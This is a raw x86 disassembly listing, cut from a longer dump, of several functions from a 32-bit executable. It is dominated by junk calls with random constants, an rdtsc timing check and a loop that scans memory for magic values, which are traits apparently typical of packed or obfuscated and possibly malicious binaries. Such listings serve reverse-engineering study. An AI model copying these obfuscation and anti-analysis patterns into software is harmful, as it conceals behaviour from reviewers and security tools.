  406b41:	push   0xcf29ae00
  406b46:	call   0x408e8e
  406b4b:	add    esp,0x4
  406b4e:	call   esi
  406b50:	cmp    esi,0xfffffff8
  406b53:	je     0x406d0b
  406b59:	push   0x5bce5c00
  406b5e:	push   0x4f2cf000
  406b63:	push   0x8bcdc200
  406b68:	call   0x408c13
  406b6d:	add    esp,0xc
  406b70:	push   0x57619a00
  406b75:	call   0x40807c
  406b7a:	add    esp,0x4
  406b7d:	mov    ebx,DWORD PTR [ebp-0x3c]
  406b80:	or     ebx,edi
  406b82:	push   0xd3c51000
  406b87:	push   0xfffffff2
  406b89:	push   0x3f
  406b8b:	push   0x66
  406b8d:	call   0x408589
  406b92:	add    esp,0x10
  406b95:	call   0x408da2
  406b9a:	push   0x9ff1ad00
  406b9f:	call   0x408c13
  406ba4:	add    esp,0x4
  406ba7:	push   0xffffffe7
  406ba9:	push   0xcf996000
  406bae:	push   0x5742fc00
  406bb3:	push   0xffffff84
  406bb5:	push   0x33a98e00
  406bba:	call   0x408aa5
  406bbf:	add    esp,0x14
  406bc2:	cmp    esi,0xfffffff5
  406bc5:	jne    0x406d0b
  406bcb:	xor    edx,edx
  406bcd:	call   0x408da2
  406bd2:	push   0xfffffffb
  406bd4:	call   0x408250
  406bd9:	add    esp,0x4
  406bdc:	push   0x8bd48600
  406be1:	push   0xa3f1fb00
  406be6:	call   0x40807c
  406beb:	add    esp,0x8
  406bee:	sub    ebx,esi
  406bf0:	push   0x23
  406bf2:	call   0x408c13
  406bf7:	add    esp,0x4
  406bfa:	push   0xffffffa2
  406bfc:	push   0xfffffff7
  406bfe:	push   0x2bbd2e00
  406c03:	call   0x408589
  406c08:	add    esp,0xc
  406c0b:	push   0xcf5c0300
  406c10:	push   0xf50ef600
  406c15:	call   0x40807c
  406c1a:	add    esp,0x8
  406c1d:	mov    edi,0xc5
  406c22:	add    ebx,ebx
  406c24:	sub    edi,esi
  406c26:	push   0x67
  406c28:	push   0xdb9fb700
  406c2d:	call   0x408589
  406c32:	add    esp,0x8
  406c35:	push   0x60
  406c37:	push   0x68
  406c39:	push   0x27
  406c3b:	push   0xffffffda
  406c3d:	push   0xffffffa1
  406c3f:	call   0x408da2
  406c44:	add    esp,0x14
  406c47:	sub    edi,esi
  406c49:	push   0x97e56200
  406c4e:	push   0xffe81a00
  406c53:	push   0x57888e00
  406c58:	push   0xcf0c9300
  406c5d:	push   0x554d4500
  406c62:	call   0x4086d1
  406c67:	add    esp,0x14
  406c6a:	push   0xebe3b000
  406c6f:	push   0x6c
  406c71:	push   0x2519ba00
  406c76:	push   0x49
  406c78:	push   0xf54a3a00
  406c7d:	call   0x40807c
  406c82:	add    esp,0x14
  406c85:	push   0x33b61a00
  406c8a:	push   0xfffffffd
  406c8c:	call   0x408aa5
  406c91:	add    esp,0x8
  406c94:	call   0x408589
  406c99:	push   0xb
  406c9b:	push   0x7501eb00
  406ca0:	push   0x3ef2600
  406ca5:	push   0x29
  406ca7:	push   0xffffff91
  406ca9:	call   0x408da2
  406cae:	add    esp,0x14
  406cb1:	call   0x40807c
  406cb6:	call   0x40807c
  406cbb:	sub    ebx,eax
  406cbd:	call   0x4086d1
  406cc2:	or     DWORD PTR [ebp-0xc],ebx
  406cc5:	sub    edi,ebx
  406cc7:	push   0xffffffdd
  406cc9:	push   0x5f
  406ccb:	call   0x408aa5
  406cd0:	add    esp,0x8
  406cd3:	push   0xffffffc4
  406cd5:	push   0xa7f80b00
  406cda:	call   0x408589
  406cdf:	add    esp,0x8
  406ce2:	push   0xbfe78800
  406ce7:	push   0x43add900
  406cec:	push   0x69
  406cee:	call   0x408c13
  406cf3:	add    esp,0xc
  406cf6:	call   0x408aa5
  406cfb:	push   0xbff0a400
  406d00:	call   0x408589
  406d05:	add    esp,0x4
  406d08:	and    DWORD PTR [ebp-0x3c],edi
  406d0b:	mov    ebx,DWORD PTR [ebp-0xc]
  406d0e:	mov    ecx,eax
  406d10:	cmp    ebx,DWORD PTR ds:0x44a3a8
  406d16:	je     0x406e93
  406d1c:	or     ebx,esi
  406d1e:	push   0x35342200
  406d23:	push   0x4381e800
  406d28:	push   0xa7ba9400
  406d2d:	push   0x55748300
  406d32:	call   0x408817
  406d37:	add    esp,0x10
  406d3a:	push   0x57524300
  406d3f:	push   0xffffffac
  406d41:	push   0xc5277600
  406d46:	push   0xf7067600
  406d4b:	call   0x408589
  406d50:	add    esp,0x10
  406d53:	push   0x4fcad200
  406d58:	push   0xf57ea200
  406d5d:	call   0x408817
  406d62:	add    esp,0x8
  406d65:	add    ebx,eax
  406d67:	push   0x32
  406d69:	push   0xb5469c00
  406d6e:	push   0xabbe6400
  406d73:	push   0x40
  406d75:	call   0x408da2
  406d7a:	add    esp,0x10
  406d7d:	push   0x55171f00
  406d82:	call   0x408da2
  406d87:	add    esp,0x4
  406d8a:	mov    edx,DWORD PTR [ebp-0xc]
  406d8d:	push   0xffffffd7
  406d8f:	call   0x408250
  406d94:	add    esp,0x4
  406d97:	mov    esi,edi
  406d99:	call   0x408589
  406d9e:	cmp    esi,ebx
  406da0:	jne    0x406e93
  406da6:	push   0xb7c9d400
  406dab:	push   0xf5307600
  406db0:	push   0x9bca0900
  406db5:	push   0x57223000
  406dba:	call   0x408aa5
  406dbf:	add    esp,0x10
  406dc2:	mov    edx,0x25466821
  406dc7:	push   0x67878500
  406dcc:	push   0x754f7300
  406dd1:	call   0x408589
  406dd6:	add    esp,0x8
  406dd9:	push   0x7927300
  406dde:	push   0xffffffd1
  406de0:	call   0x408250
  406de5:	add    esp,0x8
  406de8:	push   0x13
  406dea:	push   0x45071300
  406def:	push   0xfffffffa
  406df1:	push   0xffffffe3
  406df3:	call   0x408e8e
  406df8:	add    esp,0x10
  406dfb:	mov    eax,DWORD PTR [ebp-0xc]
  406dfe:	push   0xffffffb9
  406e00:	push   0xffffffd4
  406e02:	push   0xfffffff8
  406e04:	push   0x2c
  406e06:	call   0x408aa5
  406e0b:	add    esp,0x10
  406e0e:	push   0xffffffd2
  406e10:	push   0x1d
  406e12:	push   0x76
  406e14:	push   0xcf15df00
  406e19:	push   0x70
  406e1b:	call   0x4086d1
  406e20:	add    esp,0x14
  406e23:	push   0x77f5cb00
  406e28:	push   0x24
  406e2a:	push   0xcf4c9e00
  406e2f:	push   0xcfeb2a00
  406e34:	call   0x408e8e
  406e39:	add    esp,0x10
  406e3c:	test   ebx,0xb2
  406e42:	jne    0x406e93
  406e44:	xor    ecx,ecx
  406e46:	sub    DWORD PTR [ebp-0xc],ecx
  406e49:	push   0xcf53d500
  406e4e:	push   0xd
  406e50:	push   0xffffff9a
  406e52:	call   0x40807c
  406e57:	add    esp,0xc
  406e5a:	sub    DWORD PTR [ebp-0x3c],esi
  406e5d:	call   0x408e8e
  406e62:	push   0xf53a6e00
  406e67:	push   0x93cb4200
  406e6c:	push   0xffffffa7
  406e6e:	call   0x408817
  406e73:	add    esp,0xc
  406e76:	push   0x1f
  406e78:	push   0xfffffffe
  406e7a:	push   0x35
  406e7c:	call   0x4086d1
  406e81:	add    esp,0xc
  406e84:	sub    ebx,edi
  406e86:	push   0x36
  406e88:	call   0x408250
  406e8d:	add    esp,0x4
  406e90:	sub    DWORD PTR [ebp-0x3c],ebx
  406e93:	call   0x408da2
  406e98:	push   0xffffff84
  406e9a:	push   0xdfda7d00
  406e9f:	push   0x55375200
  406ea4:	call   0x40807c
  406ea9:	add    esp,0xc
  406eac:	push   0xffffffd2
  406eae:	push   0xffffffb9
  406eb0:	push   0xabea9800
  406eb5:	call   0x408250
  406eba:	add    esp,0xc
  406ebd:	mov    ecx,0xb884
  406ec2:	mov    eax,0x4a
  406ec7:	add    DWORD PTR [ebp-0xc],ecx
  406eca:	push   0x25782300
  406ecf:	call   0x408817
  406ed4:	add    esp,0x4
  406ed7:	push   0xffffffd4
  406ed9:	push   0xffffffc2
  406edb:	push   0x570de200
  406ee0:	push   0xb52bfe00
  406ee5:	push   0xffffffb4
  406ee7:	call   0x408e8e
  406eec:	add    esp,0x14
  406eef:	push   0x5f856e00
  406ef4:	call   0x408da2
  406ef9:	add    esp,0x4
  406efc:	call   0x408c13
  406f01:	pop    edi
  406f02:	cmp    edi,0x7000b02
  406f08:	je     0x406f0f
  406f0a:	call   0x408aa5
  406f0f:	pop    esi
  406f10:	push   0xbf84e200
  406f15:	push   0xc536e200
  406f1a:	push   0xffffffc0
  406f1c:	call   0x408250
  406f21:	add    esp,0xc
  406f24:	push   0x2fae6700
  406f29:	push   0xb5635500
  406f2e:	push   0x9babb500
  406f33:	push   0xffffffc5
  406f35:	call   0x408589
  406f3a:	add    esp,0x10
  406f3d:	pop    ebx
  406f3e:	call   0x408817
  406f43:	leave  
  406f44:	ret    
  406f45:	int3   
  406f46:	int3   
  406f47:	int3   
  406f48:	int3   
  406f49:	int3   
  406f4a:	push   ebp
  406f4b:	mov    ebp,esp
  406f4d:	sub    esp,0x48
  406f50:	push   0xe59ec900
  406f55:	push   0xffffff96
  406f57:	push   0xf714c200
  406f5c:	push   0x68
  406f5e:	call   0x408da2
  406f63:	add    esp,0x10
  406f66:	call   0x408aa5
  406f6b:	push   ebx
  406f6c:	mov    edx,DWORD PTR ds:0x44a3b8
  406f72:	mov    DWORD PTR [ebp-0x20],edx
  406f75:	push   esi
  406f76:	push   0x44
  406f78:	call   0x408c13
  406f7d:	add    esp,0x4
  406f80:	push   edi
  406f81:	push   0xa7222600
  406f86:	push   0xffffffd6
  406f88:	call   0x408817
  406f8d:	add    esp,0x8
  406f90:	mov    ebx,eax
  406f92:	push   0xffffffde
  406f94:	call   0x40807c
  406f99:	add    esp,0x4
  406f9c:	mov    eax,0xd5
  406fa1:	push   0xffffffcc
  406fa3:	push   0x77da3300
  406fa8:	push   0xffffffab
  406faa:	push   0x859fc700
  406faf:	call   0x408817
  406fb4:	add    esp,0x10
  406fb7:	cmp    ebx,0x1d32
  406fbd:	jne    0x407090
  406fc3:	push   0x1c
  406fc5:	push   0x23762700
  406fca:	push   0x57991b00
  406fcf:	push   0xfffffff3
  406fd1:	push   0x35d82a00
  406fd6:	call   0x408da2
  406fdb:	add    esp,0x14
  406fde:	push   0x77f59400
  406fe3:	push   0x6e
  406fe5:	push   0x4f8bf700
  406fea:	push   0x43762500
  406fef:	call   0x408817
  406ff4:	add    esp,0x10
  406ff7:	mov    esi,0x45
  406ffc:	call   0x408da2
  407001:	push   0xffffffe8
  407003:	call   0x408e8e
  407008:	add    esp,0x4
  40700b:	push   0xe74e7600
  407010:	push   0x95cc1400
  407015:	push   0x937f9200
  40701a:	push   0xffffff85
  40701c:	push   0x95d46000
  407021:	call   0x408250
  407026:	add    esp,0x14
  407029:	sub    DWORD PTR [ebp-0x20],esi
  40702c:	add    ebx,ebx
  40702e:	sub    ebx,eax
  407030:	push   0x70
  407032:	call   0x408aa5
  407037:	add    esp,0x4
  40703a:	push   0xeb29f500
  40703f:	push   0x3d
  407041:	push   0xb5e67400
  407046:	push   0xffffffbf
  407048:	push   0x25ad2200
  40704d:	call   0x408da2
  407052:	add    esp,0x14
  407055:	and    ebx,esi
  407057:	push   0xffffffae
  407059:	push   0xb31e2700
  40705e:	push   0xdf5ab200
  407063:	push   0x18
  407065:	push   0x1e
  407067:	call   0x408817
  40706c:	add    esp,0x14
  40706f:	push   0xcf84f800
  407074:	push   0x22
  407076:	push   0x55c50f00
  40707b:	push   0x73
  40707d:	push   0x1d
  40707f:	call   0x408589
  407084:	add    esp,0x14
  407087:	mov    eax,DWORD PTR [ebp-0x20]
  40708a:	add    DWORD PTR [ebp-0x20],ebx
  40708d:	sub    DWORD PTR [ebp-0x20],eax
  407090:	push   0x13771600
  407095:	push   0x57dc0d00
  40709a:	push   0xffffffee
  40709c:	call   0x4086d1
  4070a1:	add    esp,0xc
  4070a4:	mov    DWORD PTR [ebp-0x28],0xe066e5ed
  4070ab:	add    DWORD PTR [ebp-0x20],eax
  4070ae:	push   0xffffff92
  4070b0:	push   0x48
  4070b2:	call   0x408c13
  4070b7:	add    esp,0x8
  4070ba:	call   0x4075c3
  4070bf:	mov    esi,DWORD PTR ds:0x44a3d8
  4070c5:	mov    ecx,0x45
  4070ca:	or     DWORD PTR [ebp-0x20],esi
  4070cd:	add    ecx,eax
  4070cf:	cmp    ecx,ebx
  4070d1:	je     0x4070d6
  4070d3:	and    DWORD PTR [ebp-0x20],ecx
  4070d6:	mov    DWORD PTR [ebp-0x1c],eax
  4070d9:	call   0x408da2
  4070de:	push   0x7335f200
  4070e3:	push   0xc5b65100
  4070e8:	push   0x48
  4070ea:	push   0xffffffc0
  4070ec:	call   0x408250
  4070f1:	add    esp,0x10
  4070f4:	call   0x4075c3
  4070f9:	mov    edx,DWORD PTR [ebp-0x20]
  4070fc:	mov    esi,edx
  4070fe:	sub    DWORD PTR [ebp-0x20],esi
  407101:	mov    DWORD PTR [ebp-0x30],eax
  407104:	push   0x27318200
  407109:	push   0x8fc85f00
  40710e:	push   0xffffffa6
  407110:	call   0x408c13
  407115:	add    esp,0xc
  407118:	call   0x4075c3
  40711d:	xor    ebx,ebx
  40711f:	mov    edi,0xb473
  407124:	add    edi,edi
  407126:	xor    DWORD PTR [ebp-0x20],eax
  407129:	add    DWORD PTR [ebp-0x20],ebx
  40712c:	and    edi,eax
  40712e:	and    DWORD PTR [ebp-0x20],edi
  407131:	mov    DWORD PTR [ebp-0x18],eax
  407134:	push   0xf7e79000
  407139:	push   0xffffffe5
  40713b:	push   0x56
  40713d:	push   0x5ccc300
  407142:	push   0x8b2d1500
  407147:	call   0x408589
  40714c:	add    esp,0x14
  40714f:	call   0x408e8e
  407154:	mov    eax,DWORD PTR [ebp-0x30]
  407157:	cmp    eax,DWORD PTR [ebp-0x40]
  40715a:	jne    0x407169
  40715c:	mov    edi,esi
  40715e:	sub    DWORD PTR [ebp-0x20],eax
  407161:	cmp    edi,0xffffffd6
  407164:	je     0x407169
  407166:	sub    DWORD PTR [ebp-0x20],edi
  407169:	sub    eax,DWORD PTR [ebp-0x1c]
  40716c:	add    DWORD PTR [ebp-0x20],eax
  40716f:	xor    eax,0x846f0700
  407174:	mov    ebx,esi
  407176:	mov    edi,0x6de6
  40717b:	add    edi,eax
  40717d:	add    DWORD PTR [ebp-0x20],edi
  407180:	sub    DWORD PTR [ebp-0x20],ebx
  407183:	mov    edx,DWORD PTR [ebp-0x18]
  407186:	mov    esi,DWORD PTR [ebp-0x20]
  407189:	add    DWORD PTR [ebp-0x20],esi
  40718c:	sub    edx,DWORD PTR [ebp-0x30]
  40718f:	cmp    edx,0x4721
  407195:	jne    0x4071cf
  407197:	mov    edi,eax
  407199:	xor    esi,esi
  40719b:	cmp    edi,0x67
  40719e:	jne    0x4071cf
  4071a0:	add    esi,edx
  4071a2:	mov    ecx,DWORD PTR [ebp-0x20]
  4071a5:	mov    ebx,0xb9
  4071aa:	cmp    edi,DWORD PTR [ebp-0x34]
  4071ad:	je     0x4071cf
  4071af:	cmp    ecx,0x30b
  4071b5:	je     0x4071cf
  4071b7:	or     DWORD PTR [ebp-0x20],esi
  4071ba:	cmp    edi,DWORD PTR ds:0x44a3d8
  4071c0:	je     0x4071cf
  4071c2:	cmp    edi,DWORD PTR [ebp-0x3c]
  4071c5:	jne    0x4071cf
  4071c7:	add    ecx,edi
  4071c9:	and    DWORD PTR [ebp-0x20],ecx
  4071cc:	add    DWORD PTR [ebp-0x20],ebx
  4071cf:	xor    edx,0x846f0705
  4071d5:	and    DWORD PTR [ebp-0x20],edx
  4071d8:	cmp    eax,edx
  4071da:	je     0x40736c
  4071e0:	push   0x4fc12600
  4071e5:	push   0x57c9a600
  4071ea:	push   0xffffffc0
  4071ec:	push   0xcfaf5700
  4071f1:	call   0x408aa5
  4071f6:	add    esp,0x10
  4071f9:	push   0x44a3b0
  4071fe:	call   DWORD PTR ds:0x44a1c4
  407204:	mov    ebx,0x16
  407209:	cmp    eax,DWORD PTR [ebp-0xc]
  40720c:	jne    0x407219
  40720e:	mov    edx,DWORD PTR ds:0x44a3dc
  407214:	sub    ebx,edx
  407216:	xor    DWORD PTR [ebp-0x20],ebx
  407219:	or     eax,eax
  40721b:	je     0x40736c
  407221:	xor    esi,esi
  407223:	add    esi,eax
  407225:	xor    edx,edx
  407227:	add    DWORD PTR [ebp-0x20],esi
  40722a:	sub    edx,edi
  40722c:	add    edx,edi
  40722e:	sub    edx,ebx
  407230:	sub    DWORD PTR [ebp-0x20],edx
  407233:	add    DWORD PTR [ebp-0x28],0x453860e
  40723a:	mov    edi,DWORD PTR ds:0x44a398
  407240:	mov    ebx,0xf6
  407245:	and    DWORD PTR [ebp-0x20],ebx
  407248:	sub    edi,esi
  40724a:	cmp    edx,0xffffffd2
  40724d:	jne    0x407254
  40724f:	sub    edi,ebx
  407251:	mov    DWORD PTR [ebp-0x44],edi
  407254:	lea    ecx,[eax+0x8b7]
  40725a:	add    eax,eax
  40725c:	mov    edx,DWORD PTR [ebp-0x20]
  40725f:	cmp    edi,DWORD PTR ds:0x44a398
  407265:	jne    0x4072cb
  407267:	test   ecx,0xaf
  40726d:	jne    0x4072cb
  40726f:	mov    edi,DWORD PTR [ebp-0x20]
  407272:	cmp    edx,DWORD PTR ds:0x44a3d8
  407278:	jne    0x4072cb
  40727a:	add    eax,eax
  40727c:	mov    esi,DWORD PTR [ebp-0x20]
  40727f:	cmp    ecx,DWORD PTR [ebp-0x44]
  407282:	je     0x4072cb
  407284:	mov    ebx,0x47
  407289:	add    DWORD PTR [ebp-0x20],edi
  40728c:	add    ebx,ebx
  40728e:	and    eax,ecx
  407290:	add    DWORD PTR [ebp-0x20],edx
  407293:	or     esi,ecx
  407295:	sub    DWORD PTR [ebp-0x20],eax
  407298:	and    esi,edx
  40729a:	cmp    edx,DWORD PTR ds:0x44a3dc
  4072a0:	je     0x4072cb
  4072a2:	mov    edi,DWORD PTR [ebp-0x20]
  4072a5:	sub    esi,ecx
  4072a7:	add    ebx,edx
  4072a9:	mov    eax,DWORD PTR ds:0x44a3e4
  4072af:	mov    DWORD PTR [ebp-0x20],edi
  4072b2:	test   esi,0xb
  4072b8:	je     0x4072cb
  4072ba:	add    DWORD PTR [ebp-0x20],ebx
  4072bd:	sub    esi,eax
  4072bf:	cmp    edi,DWORD PTR [ebp-0x34]
  4072c2:	je     0x4072cb
  4072c4:	sub    esi,ebx
  4072c6:	mov    edi,esi
  4072c8:	sub    DWORD PTR [ebp-0x20],edi
  4072cb:	inc    ecx
  4072cc:	mov    esi,0xa494
  4072d1:	add    DWORD PTR [ebp-0x20],esi
  4072d4:	mov    esi,DWORD PTR [ecx]
  4072d6:	mov    ebx,DWORD PTR [ebp-0x20]
  4072d9:	mov    edx,0x81
  4072de:	add    DWORD PTR [ebp-0x20],esi
  4072e1:	cmp    ebx,DWORD PTR ds:0x44a398
  4072e7:	je     0x4072f9
  4072e9:	sub    ebx,ecx
  4072eb:	mov    edx,0x81
  4072f0:	mov    DWORD PTR [ebp-0x20],ecx
  4072f3:	sub    DWORD PTR [ebp-0x20],edx
  4072f6:	add    DWORD PTR [ebp-0x20],ebx
  4072f9:	sub    esi,0x1c0355b4
  4072ff:	mov    ebx,DWORD PTR [ebp-0x20]
  407302:	mov    edx,ebx
  407304:	cmp    edx,DWORD PTR ds:0x44a3b8
  40730a:	je     0x40732f
  40730c:	add    edx,eax
  40730e:	mov    ebx,DWORD PTR [ebp-0x20]
  407311:	cmp    ebx,0xc3268e4c
  407317:	jne    0x40732f
  407319:	add    DWORD PTR [ebp-0x20],esi
  40731c:	add    ebx,eax
  40731e:	sub    ebx,ecx
  407320:	sub    edx,ecx
  407322:	add    DWORD PTR [ebp-0x20],edi
  407325:	add    ebx,edi
  407327:	add    DWORD PTR [ebp-0x20],edx
  40732a:	and    ebx,edx
  40732c:	add    DWORD PTR [ebp-0x20],ebx
  40732f:	cmp    esi,0xe49d3d4b
  407335:	jne    0x40725a
  40733b:	or     DWORD PTR [ebp-0x20],edx
  40733e:	mov    esi,DWORD PTR [ecx+0x4]
  407341:	push   0x1
  407343:	push   0xffffff8d
  407345:	push   0x25875100
  40734a:	push   0x9316a000
  40734f:	push   0xb00b900
  407354:	call   0x408c13
  407359:	add    esp,0x14
  40735c:	push   0x35b76f00
  407361:	call   0x408da2
  407366:	add    esp,0x4
  407369:	sub    DWORD PTR [ebp-0x28],esi
  40736c:	mov    ecx,0x18
  407371:	push   0x8fb0a800
  407376:	call   0x4086d1
  40737b:	add    esp,0x4
  40737e:	push   0xd58c8c00
  407383:	push   0x8f575700
  407388:	push   0x65
  40738a:	call   0x408c13
  40738f:	add    esp,0xc
  407392:	sub    edi,eax
  407394:	cmp    edi,DWORD PTR [ebp-0x10]
  407397:	je     0x4074da
  40739d:	test   edi,0x51000c20
  4073a3:	jne    0x4074da
  4073a9:	mov    esi,DWORD PTR [ebp-0x20]
  4073ac:	push   0xfffffff6
  4073ae:	push   0x130d0300
  4073b3:	push   0x3279900
  4073b8:	call   0x408da2
  4073bd:	add    esp,0xc
  4073c0:	push   0xffffff8c
  4073c2:	push   0x77a70700
  4073c7:	push   0x33
  4073c9:	call   0x408da2
  4073ce:	add    esp,0xc
  4073d1:	push   0xffffffa7
  4073d3:	push   0xffffff9b
  4073d5:	call   0x408aa5
  4073da:	add    esp,0x8
  4073dd:	xor    DWORD PTR [ebp-0x20],edi
  4073e0:	mov    ebx,0x9dff
  4073e5:	push   0xffffff9d
  4073e7:	push   0x2
  4073e9:	push   0xf7dd4300
  4073ee:	push   0x39
  4073f0:	call   0x408817
  4073f5:	add    esp,0x10
  4073f8:	call   0x40807c
  4073fd:	push   0x47340400
  407402:	push   0xab310c00
  407407:	call   0x408817
  40740c:	add    esp,0x8
  40740f:	sub    DWORD PTR [ebp-0x20],esi
  407412:	push   0x57f6af00
  407417:	push   0x532a1d00
  40741c:	call   0x408817
  407421:	add    esp,0x8
  407424:	push   0x1
  407426:	push   0xf5eed100
  40742b:	push   0x21
  40742d:	push   0x24
  40742f:	call   0x408da2
  407434:	add    esp,0x10
  407437:	push   0xb58af700
  40743c:	push   0x57ecc700
  407441:	push   0x5e
  407443:	push   0xd71d5a00
  407448:	push   0x74
  40744a:	call   0x408250
  40744f:	add    esp,0x14
  407452:	push   0x7579200
  407457:	call   0x408250
  40745c:	add    esp,0x4
  40745f:	push   0xffffffe2
  407461:	push   0xffffffcb
  407463:	call   0x408aa5
  407468:	add    esp,0x8
  40746b:	push   0x5f
  40746d:	push   0x1b
  40746f:	push   0x4b0c7f00
  407474:	call   0x408e8e
  407479:	add    esp,0xc
  40747c:	push   0x85f23a00
  407481:	call   0x408250
  407486:	add    esp,0x4
  407489:	push   0x57f8a500
  40748e:	push   0x5a
  407490:	push   0x373f2c00
  407495:	push   0x77
  407497:	push   0xe717f900
  40749c:	call   0x408aa5
  4074a1:	add    esp,0x14
  4074a4:	sub    ebx,eax
  4074a6:	and    ebx,esi
  4074a8:	cmp    ebx,DWORD PTR [ebp-0x2c]
  4074ab:	jne    0x4074da
  4074ad:	call   0x408589
  4074b2:	sub    ebx,esi
  4074b4:	call   0x408e8e
  4074b9:	test   ebx,0x4700f246
  4074bf:	je     0x4074da
  4074c1:	and    ebx,edi
  4074c3:	push   0xa716bf00
  4074c8:	call   0x40807c
  4074cd:	add    esp,0x4
  4074d0:	call   0x408aa5
  4074d5:	add    ebx,edi
  4074d7:	add    DWORD PTR [ebp-0x20],ebx
  4074da:	mov    esi,DWORD PTR [ebp+0xc]
  4074dd:	mov    ebx,DWORD PTR ds:0x44a3d8
  4074e3:	mov    eax,DWORD PTR [ebp-0x20]
  4074e6:	call   0x408589
  4074eb:	sub    DWORD PTR [ebp-0x20],esi
  4074ee:	push   0xffffffe0
  4074f0:	push   0x4c
  4074f2:	push   0x65ad9b00
  4074f7:	call   0x4086d1
  4074fc:	add    esp,0xc
  4074ff:	call   0x408aa5
  407504:	sub    ebx,esi
  407506:	xor    DWORD PTR [ebp-0x20],ebx
  407509:	mov    ebx,DWORD PTR [ebp-0x28]
  40750c:	cmp    ebx,0x71
  40750f:	jne    0x407524
  407511:	push   0x57
  407513:	push   0x2349b200
  407518:	push   0x10
  40751a:	push   0x76
  40751c:	call   0x408aa5
  407521:	add    esp,0x10
  407524:	push   0x76
  407526:	push   0x45
  407528:	push   0xffffffc5
  40752a:	push   0x75e05700
  40752f:	call   0x408817
  407534:	add    esp,0x10
  407537:	mov    DWORD PTR [esi+0x0],ebx
  40753a:	sub    DWORD PTR [ebp-0x20],edi
  40753d:	push   0x9f270600
  407542:	call   0x408589
  407547:	add    esp,0x4
  40754a:	sub    DWORD PTR [ebp-0x20],edi
  40754d:	push   0x831e0500
  407552:	push   0x4fb2aa00
  407557:	push   0xfffffff0
  407559:	push   0xa5f65d00
  40755e:	push   0xfffffffe
  407560:	call   0x408e8e
  407565:	add    esp,0x14
  407568:	pop    edi
  407569:	push   0xffffffb6
  40756b:	push   0xffffff9b
  40756d:	push   0xf5f5500
  407572:	call   0x4086d1
  407577:	add    esp,0xc
  40757a:	push   0xffffffd8
  40757c:	push   0xc
  40757e:	push   0xff75000
  407583:	call   0x4086d1
  407588:	add    esp,0xc
  40758b:	pop    esi
  40758c:	or     eax,ebx
  40758e:	sub    eax,ebx
  407590:	add    eax,esi
  407592:	add    DWORD PTR [ebp-0x20],eax
  407595:	push   0x35
  407597:	push   0xb
  407599:	call   0x408c13
  40759e:	add    esp,0x8
  4075a1:	pop    ebx
  4075a2:	mov    edx,DWORD PTR [ebp-0x20]
  4075a5:	sub    edx,edi
  4075a7:	mov    ecx,DWORD PTR ds:0x44a3b8
  4075ad:	push   0xf5b73b00
  4075b2:	call   0x408589
  4075b7:	add    esp,0x4
  4075ba:	leave  
  4075bb:	ret    0x8
  4075be:	int3   
  4075bf:	int3   
  4075c0:	int3   
  4075c1:	int3   
  4075c2:	int3   
  4075c3:	push   ebp
  4075c4:	mov    ebp,esp
  4075c6:	sub    esp,0x40
  4075c9:	push   0x77
  4075cb:	push   0xffffffce
  4075cd:	push   0xffffff84
  4075cf:	push   0x57a73900
  4075d4:	push   0x93489a00
  4075d9:	call   0x408250
  4075de:	add    esp,0x14
  4075e1:	push   0x7368a100
  4075e6:	push   0x73
  4075e8:	push   0xffffffec
  4075ea:	push   0x68
  4075ec:	push   0xe5ab8400
  4075f1:	call   0x40807c
  4075f6:	add    esp,0x14
  4075f9:	push   ebx
  4075fa:	push   0x78
  4075fc:	push   0x10
  4075fe:	push   0x2b412600
  407603:	push   0x9
  407605:	push   0x29
  407607:	call   0x408250
  40760c:	add    esp,0x14
  40760f:	push   0x57a05000
  407614:	push   0x2b596400
  407619:	call   0x408c13
  40761e:	add    esp,0x8
  407621:	push   esi
  407622:	push   0xc74c8d00
  407627:	push   0x2f350000
  40762c:	push   0xffffff9f
  40762e:	push   0x57fbad00
  407633:	call   0x40807c
  407638:	add    esp,0x10
  40763b:	push   edi
  40763c:	push   0x45addc00
  407641:	push   0xff52bb00
  407646:	push   0xffffff94
  407648:	push   0x95da6000
  40764d:	push   0x54
  40764f:	call   0x40807c
  407654:	add    esp,0x14
  407657:	push   0x57e06400
  40765c:	call   0x408250
  407661:	add    esp,0x4
  407664:	call   0x408aa5
  407669:	push   0x11
  40766b:	push   0x7d
  40766d:	call   0x408250
  407672:	add    esp,0x8
  407675:	mov    edi,DWORD PTR ds:0x44a3c8
  40767b:	push   0xf7d31400
  407680:	push   0xffffff85
  407682:	push   0x41
  407684:	call   0x408250
  407689:	add    esp,0xc
  40768c:	call   0x408c13
  407691:	push   0xffffffb8
  407693:	push   0x26
  407695:	push   0xffffffad
  407697:	push   0xf7e54200
  40769c:	call   0x408c13
  4076a1:	add    esp,0x10
  4076a4:	mov    DWORD PTR [ebp-0x40],edi
  4076a7:	call   0x408aa5
  4076ac:	rdtsc  
  4076ae:	xor    edx,edx
  4076b0:	mov    edi,DWORD PTR [ebp-0x40]
  4076b3:	mov    DWORD PTR [ebp-0x40],edx
  4076b6:	add    DWORD PTR [ebp-0x40],edi
  4076b9:	mov    ecx,eax
  4076bb:	sub    DWORD PTR [ebp-0x40],ecx
  4076be:	mov    esi,DWORD PTR [ebp-0x40]
  4076c1:	mov    ecx,DWORD PTR [ebp-0x40]
  4076c4:	add    DWORD PTR [ebp-0x40],esi
  4076c7:	add    DWORD PTR [ebp-0x40],ecx
  4076ca:	pop    edi
  4076cb:	add    DWORD PTR [ebp-0x40],edi
  4076ce:	pop    esi
  4076cf:	sub    DWORD PTR [ebp-0x40],esi
  4076d2:	pop    ebx
  4076d3:	xor    ecx,ecx
  4076d5:	mov    edx,DWORD PTR [ebp-0x40]
  4076d8:	test   edi,0x57
  4076de:	jne    0x407711
  4076e0:	test   edx,0x23044021
  4076e6:	jne    0x407711
  4076e8:	or     edx,ecx
  4076ea:	mov    ecx,DWORD PTR [ebp-0x40]
  4076ed:	cmp    ecx,0xffffffc9
  4076f0:	jne    0x407711
  4076f2:	mov    DWORD PTR [ebp-0x40],ebx
  4076f5:	sub    ecx,edi
  4076f7:	cmp    edx,DWORD PTR ds:0x44a3c8
  4076fd:	je     0x407711
  4076ff:	sub    DWORD PTR [ebp-0x40],ecx
  407702:	sub    edx,ebx
  407704:	add    edx,edx
  407706:	mov    ecx,DWORD PTR ds:0x44a3c8
  40770c:	add    ecx,edx
  40770e:	sub    DWORD PTR [ebp-0x40],ecx
  407711:	leave  
  407712:	ret    
  407713:	int3   
  407714:	int3   
  407715:	int3   
  407716:	int3   
  407717:	int3   
  407718:	push   ebp
  407719:	mov    ebp,esp
  40771b:	sub    esp,0x34
  40771e:	xor    ecx,ecx
  407720:	call   0x408817
  407725:	call   0x408250
  40772a:	push   ebx
  40772b:	push   0x7d
  40772d:	push   0xfe34700
